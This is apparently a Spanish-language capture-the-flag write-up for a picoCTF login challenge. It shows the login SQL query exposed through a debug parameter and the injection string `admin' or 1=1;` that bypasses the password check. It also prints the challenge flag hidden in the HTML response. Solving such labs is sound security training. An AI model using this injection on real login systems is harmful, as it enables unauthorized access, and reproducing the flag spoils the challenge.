#notas_hacking #web
# Reto
## Descripción
Can you login to this website?Try to login [here](http://saturn.picoctf.net:56804/).
## Solución

entrando con el input debug con valor 1  a `/login.php` vemos como se hace la consulta
```sqlite
username: sergio
password: sergio
SQL query: SELECT * FROM users WHERE name='sergio' AND password='sergio'
```
en la pagina logeado con `admin' or 1=1;` para omitir la password
```txt
username: admin' or 1=1;
password: admin
SQL query: SELECT * FROM users WHERE name='admin' or 1=1;' AND password='admin'

# Logged in! But can you see the flag, it is in plainsight.
```
pero en el html
```html
<pre>username: admin&#039; or 1=1;
password: admin
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; or 1=1;&#039; AND password=&#039;admin&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_9b0a4e21}</p>
```
## Notas

## Referencias
